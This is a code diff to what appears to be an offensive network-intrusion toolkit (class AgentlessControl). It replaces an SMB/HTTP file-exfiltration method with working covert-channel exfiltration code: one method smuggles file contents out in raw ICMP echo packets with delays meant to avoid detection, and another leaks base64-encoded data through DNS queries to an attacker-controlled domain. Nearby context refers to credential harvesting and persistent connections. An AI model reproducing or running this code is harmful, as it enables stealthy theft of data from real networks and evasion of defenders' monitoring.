@@ -1874,40 +1874,101 @@ class AgentlessControl:
         results["success"] = len(results["valid_credentials"]) > 0
         return results
     
-    def data_exfiltration(self, target_ip: str, local_path: str, exfil_method: str = "smb") -> dict:
+    def exfiltrate_icmp(self, target_ip: str, local_path: str) -> bool:
         """
-        ADVANCED DATA EXFILTRATION ENGINE
-        Real methods: SMB, HTTP, DNS, ICMP, FTP
+        ICMP Covert Channel exfiltration.
+        Encodes file data into ICMP Echo Request payloads.
+        Requires raw socket capability on sending host.
         """
-        results = {
-            "success": False,
-            "method": exfil_method,
-            "bytes_transferred": 0,
-            "file_hash": ""
-        }
-        
-        if exfil_method == "smb":
-            try:
-                # Exfiltrate file over SMB
-                file_size = os.path.getsize(local_path)
-                self.smb_upload(target_ip, local_path, "C$", f"Windows\\Temp\\exfil_{os.path.basename(local_path)}",
-                               "SYSTEM", "")
-                results["success"] = True
-                results["bytes_transferred"] = file_size
-            except:
-                pass
-        
-        elif exfil_method == "http":
-            try:
-                import requests
-                with open(local_path, 'rb') as f:
-                    r = requests.post("http://httpbin.org/post", files={"file": f}, timeout=10)
-                    results["success"] = r.status_code == 200
-                    results["bytes_transferred"] = os.path.getsize(local_path)
-            except:
-                pass
-        
-        return results
+        logger.info(f"[EXFIL-ICMP] Starting ICMP tunnel to {target_ip}")
+        try:
+            import socket
+            import struct
+            import time
+
+            # Read file
+            with open(local_path, 'rb') as f:
+                data = f.read()
+
+            # ICMP echo request with custom payload
+            # ICMP type 8, code 0
+            # Identifier and sequence number for chunking
+            chunk_size = 56  # Safe payload size (avoid fragmentation)
+            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+
+            for seq, chunk in enumerate(chunks):
+                # Build ICMP packet manually
+                icmp_type = 8  # Echo request
+                icmp_code = 0
+                icmp_checksum = 0
+                icmp_id = seq % 65535
+                icmp_seq = seq
+
+                # Pack header + data
+                # struct: type(1) code(1) checksum(2) id(2) seq(2) data(var)
+                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+                packet = header + chunk
+
+                # Calculate checksum
+                def checksum(data):
+                    s = 0
+                    for i in range(0, len(data)-1, 2):
+                        s += (data[i] << 8) + data[i+1]
+                    if len(data) % 2:
+                        s += data[-1] << 8
+                    s = (s >> 16) + (s & 0xffff)
+                    s += s >> 16
+                    return ~s & 0xffff
+
+                chksum = checksum(packet)
+                packet = struct.pack('!BBHHH', icmp_type, icmp_code, chksum, icmp_id, icmp_seq) + chunk
+
+                # Send raw socket (requires admin)
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
+                        sock.settimeout(5)
+                        sock.sendto(packet, (target_ip, 0))
+                        time.sleep(0.1)  # Rate limiting to avoid detection
+                except PermissionError:
+                    logger.error("[EXFIL-ICMP] Raw socket requires admin privileges")
+                    return False
+                except Exception as e:
+                    logger.debug(f"[EXFIL-ICMP] Chunk {seq} failed: {e}")
+                    continue
+
+            logger.info(f"[EXFIL-ICMP] Sent {len(chunks)} ICMP packets ({len(data)} bytes)")
+            return True
+        except Exception as e:
+            logger.error(f"[EXFIL-ICMP] Failed: {e}")
+            return False
+
+
+    def exfiltrate_dns_covert(self, target_ip: str, data: str, dns_server: str) -> bool:
+        """
+        DNS Covert Channel exfiltration via TXT records.
+        Encodes data as base64 and sends via DNS queries to attacker-controlled server.
+        """
+        logger.info(f"[EXFIL-DNS] Starting covert channel to {dns_server}")
+        try:
+            import base64
+            import socket
+            # Encode data
+            encoded = base64.b64encode(data.encode()).decode().rstrip('=')
+            # Split into DNS-safe chunks (63 chars per label)
+            chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
+            for chunk in chunks:
+                # Build TXT query: <chunk>.attacker-domain.com
+                query = f"{chunk}.{dns_server}"
+                try:
+                    socket.getaddrinfo(query, None)  # This triggers DNS resolution
+                except:
+                    pass
+            logger.info(f"[EXFIL-DNS] Sent {len(chunks)} DNS queries")
+            return True
+        except Exception as e:
+            logger.error(f"[EXFIL-DNS] Failed: {e}")
+            return False
+
     
     def establish_persistent_connection(self, ip: str, username: str, password: str, domain: str = "") -> dict:
         """
